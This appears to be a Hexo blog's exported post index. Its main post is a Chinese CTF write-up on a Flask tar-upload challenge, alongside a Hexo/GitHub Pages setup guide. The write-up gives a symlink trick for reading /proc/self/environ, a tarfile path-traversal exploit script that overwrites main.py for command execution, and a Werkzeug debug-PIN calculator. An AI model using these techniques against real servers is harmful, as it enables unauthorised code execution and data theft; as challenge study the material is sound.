[{"title":"。","url":"/2022/11/27/。/","content":"# <center>见证历史</center>"},{"title":"NSS-6","url":"/2022/11/26/NSS-6/","content":"\n## web\n\n### check(V1)&&check(V2)\n\n```python\n# -*- coding: utf-8 -*-\nfrom flask import Flask,request\nimport tarfile\nimport os\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = './uploads'\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\nALLOWED_EXTENSIONS = set(['tar'])\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n@app.route('/')\ndef index():\n    with open(__file__, 'r') as f:\n        return f.read()\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return '?'\n    file = request.files['file']\n    if file.filename == '':\n        return '?'\n    print(file.filename)\n    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:\n        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)\n        if(os.path.exists(file_save_path)):\n            return 'This file already exists'\n        file.save(file_save_path)\n    else:\n        return 'This file is not a tarfile'\n    try:\n        tar = tarfile.open(file_save_path, \"r\")\n        tar.extractall(app.config['UPLOAD_FOLDER'])\n    except Exception as e:\n        return str(e)\n    os.remove(file_save_path)\n    return 'success'\n\n@app.route('/download', methods=['POST'])\ndef download_file():\n    filename = request.form.get('filename')\n    if filename is None or filename == '':\n        return '?'\n    \n    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    \n    if '..' in filename or '/' in filename:\n        return '?'\n    \n    if not os.path.exists(filepath) or not os.path.isfile(filepath):\n        return '?'\n    \n    with open(filepath, 'r') as f:\n        return f.read()\n    \n@app.route('/clean', methods=['POST'])\ndef clean_file():\n    os.system('/tmp/clean.sh')\n    return 'success'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True, port=80)\n```\n\n对软链接没有任何限制，直接非预期了\n\n想着flask算pin，先看了下env\n\n```shell\nln -s /proc/self/environ 1\ntar -zcvf 1.tar 1     #-z 用于压缩软连接\nPOST上传\n```\n<img src=\"image-20221016221716692.png\">\n\n访问得到flag\n\n### check(Revenge)\n\n侥幸非预期拿了个一血😋\n\n```python\n# -*- coding: utf-8 -*-\nfrom flask import Flask,request\nimport tarfile\nimport os\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = './uploads'\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\nALLOWED_EXTENSIONS = set(['tar'])\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n@app.route('/')\ndef index():\n    with open(__file__, 'r') as f:\n        return f.read()\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return '?'\n    file = request.files['file']\n    if file.filename == '':\n        return '?'\n\n    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:\n        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)\n        if(os.path.exists(file_save_path)):\n            return 'This file already exists'\n        file.save(file_save_path)\n    else:\n        return 'This file is not a tarfile'\n    try:\n        tar = tarfile.open(file_save_path, \"r\")\n        tar.extractall(app.config['UPLOAD_FOLDER'])\n    except Exception as e:\n        return str(e)\n    os.remove(file_save_path)\n    return 'success'\n\n@app.route('/download', methods=['POST'])\ndef download_file():\n    filename = request.form.get('filename')\n    if filename is None or filename == '':\n        return '?'\n    \n    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    \n    if '..' in filename or '/' in filename:\n        return '?'\n    \n    if not os.path.exists(filepath) or not os.path.isfile(filepath):\n        return '?'\n    \n    if os.path.islink(filepath):\n        return '?'\n    \n    if oct(os.stat(filepath).st_mode)[-3:] != '444':\n        return '?'\n    \n    with open(filepath, 'r') as f:\n        return f.read()\n    \n@app.route('/clean', methods=['POST'])\ndef clean_file():\n    os.system('su ctf -c /tmp/clean.sh')\n    return 'success'\n\n# print(os.environ)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True, port=80)\n```\n\n`os.path.islink`对软链接进行了限制，没找到可绕过的办法(开始异想天开想着构造双层tar来看文件，直接报错嘞，正好看到文件名**main.py**，**python 3.10**)\n\n但是可以利用[**CVE-2007-4559**](https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html)通过文件名中包含`../`来覆盖远程服务器上的任何文件\n\n#### 非预期\n\n因为**flask**在debug模式开启后会**auto_reload**，所以可利用此特性，覆盖**main.py**\n\n在原来的基础上加个这个\n<img src=\"image-20221016223327232.png\">\n\n**exp**\n\n```python\nimport tarfile\nimport requests\n\ndef change_name(tarinfo):\n    tarinfo.name = \"../\" + tarinfo.name\n    return tarinfo\n\nwith tarfile.open(\"exploit.tar\", \"w:xz\") as tar:\n    tar.add(\"main.py\", filter=change_name)\n    \ndef upload():\n    res = requests.post(url=url, files={\"file\": open(\"exploit.tar\", 'rb')})\n    \nurl='http://1.14.71.254:28045/upload'\nupload()\nwhile 1:\n    a=input('bash:')\n    r=requests.post(url=url+'?a='+a)\n    print(r.text)\n```\n<img src=\"image-20221016224003715.png\">\n\n#### 预期\n\n预期是利用覆盖`/tmp/clean.sh`，然后访问`/clean` getshell\n\n然后你会发现flag是root权限才能读的\n\n所以就只能**flask算pin**来得到root权限了\n\n常用反弹shell的命令都没弹成功，不知道怎么回事，直接root权限读文件吧\n\n用户为肯定为**root**了\n\n**app.py**的位置上面已得到\n<img src=\"image-20221016233634606.png\">\n\n算pin(**详见上篇文章**)\n\n```python\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# username\n    'flask.app',# modname\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n    '2485376925239',# str(uuid.getnode()),  /sys/class/net/ens33/address\n    '96cec10d3d9307792745ec3b85c8962079be847c1c22f74bae99e457863e13fd4c60de47472f2a8d533525466d7c34de'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n            continue\n    if isinstance(bit, str):\n        bit = bit.encode(\"utf-8\")\n    h.update(bit)\nh.update(b\"cookiesalt\")\n\ncookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n\nnum = None\nif num is None:\n    h.update(b\"pinsalt\")\n    num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n\nrv=None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = \"-\".join(\n                num[x : x + group_size].rjust(group_size, \"0\")\n                for x in range(0, len(num), group_size)\n            )\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n**rce**\n\n<img src=\"image-20221016233908068.png\">\n\n","tags":["web"]},{"title":"hexo部署在Github Pages","url":"/2022/11/26/hexo部署在Github Pages/","content":"\n记录下用hexo搭建Github Pages的过程\n\n## 前言\n\n之前一直都想在服务器上搭建一个**hexo**博客，但对**node.js**完全不熟悉以及在宝塔面板上部署静态博客好像有点麻烦，就简单的用**typecho**，随便找了一个主题搭建了[博客](https://xlccccc.cn/)。\n\n**typecho**是适配markdown的，就是每个图片都要上传附件然后更改图片路径导致我自己写的md完全没有发上去的欲望\n\n而**git+hexo**就很方便了，写完直接`git push`就好了，组会也正好有这个任务，就借此机会完成了。(~~不能再拖了~~)\n\n## 环境\n\nUbuntu 22.04\n\n## node.js and npm\n\nNode的环境配置比较简单\n\n```bash\n$ sudo apt install nodejs npm\n$ node -v\nv12.22.9\n$ npm -v\nv8.5.1\n```\n\n安装的是长期版本，搭建**hexo**已经够用了\n\n## git\n\n```bash\n$ sudo apt-get install git-core\n```\n\n### 通过ssh方式链接github账户\n\n```bash\n$ git config --global user.email \"example@xx.com\"\n$ git config --global user.name \"xxx\"\n#本地生成密钥\n$ ssh-keygen -b 4096 -t rsa -C \"example@xx.com\"\n#生成后将该密钥加入到你的ssh中\n$ ssh-add ~/.ssh/id_rsa\n```\n\n然后打开**github**\n\n进入**setting**选择**SSH and GPG keys**，点击**New SSH key**\n\n取一个合适的名字，并将生成的**id_rsa.pub**中的内容复制到key中\n\n```bash\n#以ssh方式clone创建好的github pages库\n$ git clone git@github.com:xlccccc/xlccccc.github.io.git\n```\n\n此时能正常`git push`就是成功链接了\n\n(记得打开Pages，以及github学生包可以白嫖一个**.me**后缀域名)\n\n## hexo\n\n### 本地\n\n```bash\n#只有root权限才安装成功了，原因未知\n$ sudo npm install -g hexo-cli\n$ hexo init blog\n$ cd blog\n$ npm install\n#重新生成静态博客的所有内容\n$ hexo generate\n#重启 hexo 本地服务\n$ hexo server\n#安装git插件\n$ npm install hexo-deployer-git --save\n```\n\n此时访问 https://localhost:4000 可以看到本地博客页面\n\n### github pages\n\n在**_config.yml**的最后一行添加\n\n```yaml\ndeploy:\n  type: git\n  repository: git@github.com:xlccccc/xlccccc.github.io.git\n  branch: master\n```\n\n更改url为你的`github pages`\n\n```bash\n$ hexo clean\n$ hexo generate\n$ hexo deploy\n```\n\n此时访问 https://xlccccc.github.io 就可看到博客啦\n\n```bash\n$ hexo new photo \"My Gallery\"\n$ hexo generate\n$ hexo deploy\n```\n\n如果改了域名，在source下新建CNAME，内容为你的域名(如`xlccccc.me`)，然后`hexo generate` `hexo deploy`即可\n\n","tags":["dev"]},{"title":"Hello World","url":"/2022/11/26/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]